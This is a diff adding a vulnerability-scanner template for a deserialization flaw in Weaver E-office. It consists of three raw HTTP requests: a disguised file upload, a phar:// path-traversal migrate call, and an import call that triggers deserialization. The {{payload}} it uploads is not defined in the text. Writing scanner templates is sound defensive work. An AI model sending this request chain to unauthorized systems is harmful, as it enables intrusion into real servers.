@@ -1,0 +1,55 @@
+id: weaver_e_office-deserialization-CT-1156977
+info:
+  name: Weaver E-office Deserialization Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    This template detects a deserialization vulnerability in Weaver E-office software.
+http:
+  - raw:
+      - |
+        POST /eoffice10/server/public/api/attachment/atuh-file HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
+        Accept-Encoding: gzip, deflate
+        Content-Type: multipart/form-data; boundary={{random_lowercase}}
+
+        --{{random_lowercase}}\r\nContent-Disposition: form-data; name="Filedata"; filename="register.inc"\r\nContent-Type: image/jpeg\r\n\r\n{{payload}}\r\n--{{random_lowercase}}--
+    extractors:
+      - type: regex
+        internal: true
+        name: attachment_id
+        group: 1
+        regex:
+          - '"attachment_id":"(.+?)"'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "attachment_id"
+  - raw:
+      - |
+        POST /eoffice10/server/public/api/attachment/path/migrate HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        source_path=&desc_path=phar%3A%2F%2F..%2F..%2F..%2F..%2Fattachment%2F
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '"status":1'
+  - raw:
+      - |
+        POST /eoffice10/server/public/api/empower/import HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        type=tttt&file={{attachment_id}}
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '9yM86ESyFBXNDwCh6Nbsxy9wrcQrP25P'
+          - '"code":"no_file"'
